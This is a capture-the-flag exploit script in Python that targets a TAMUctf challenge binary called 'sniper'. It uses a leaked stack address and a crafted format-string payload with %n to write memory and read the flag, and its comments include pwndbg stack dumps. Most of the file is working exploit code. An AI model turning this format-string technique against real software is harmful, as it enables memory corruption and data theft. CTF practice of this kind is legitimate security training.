#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import struct

context.log_level = 'debug'
exe = context.binary = ELF('./sniper_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

brva 0x1237
brva 0x12DD
c
'''.format(**locals())

p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

# ==================== EXPLOIT ====================

def exploit():


    stack_leak = hexleak(rl())
    slog('Stack leak', stack_leak)

    flag_address_offet  = stack_leak - 0xA0A0000
    flag_address = stack_leak - flag_address_offet
    slog('Flag address', flag_address)

    # fgets stop at `\x0a` or `newline` so we need to use stack leak calculate 
    # to the third byte of that address and write to it
    '''
    00:0000│ rdx rdi rsp 0x7fff89c65f80 ◂— 0x6325632563256325 ('%c%c%c%c')
    01:0008│-038         0x7fff89c65f88 ◂— 0x6325632563256325 ('%c%c%c%c')
    02:0010│-030         0x7fff89c65f90 ◂— 0x3131256e25633225 ('%2c%n%11')
    03:0018│-028         0x7fff89c65f98 ◂— 0x4141414141417324 ('$sAAAAAA')
    04:0020│-020         0x7fff89c65fa0 —▸ 0x7fff89c65fab ◂— 0x746540000055e100
    05:0028│-018         0x7fff89c65fa8 ◂— 0x55e1000a0000
    06:0030│-010         0x7fff89c65fb0 ◂— 0x3d0746540
    07:0038│-008         0x7fff89c65fb8 ◂— 0x149f6bffddec00
    pwndbg> x/x 0x7fff89c65fa8
    0x7fff89c65fa8: 0x000055e1000a0000
    pwndbg> x/x 0x7fff89c65fa8+0x1
    0x7fff89c65fa9: 0x40000055e1000a00
    pwndbg> x/x 0x7fff89c65fa8+0x2
    0x7fff89c65faa: 0x6540000055e1000a
    pwndbg> x/x 0x7fff89c65fa8+0x3
    0x7fff89c65fab: 0x746540000055e100
    '''
    payload = b'%c%c%c%c%c%c%c%c%2c%n%11$s'.ljust(32,b'A')
    payload += p64(stack_leak + 0x2b) + p64(0xA0A0000)     

    sl(payload)

    interactive()

if __name__ == '__main__':
    exploit()
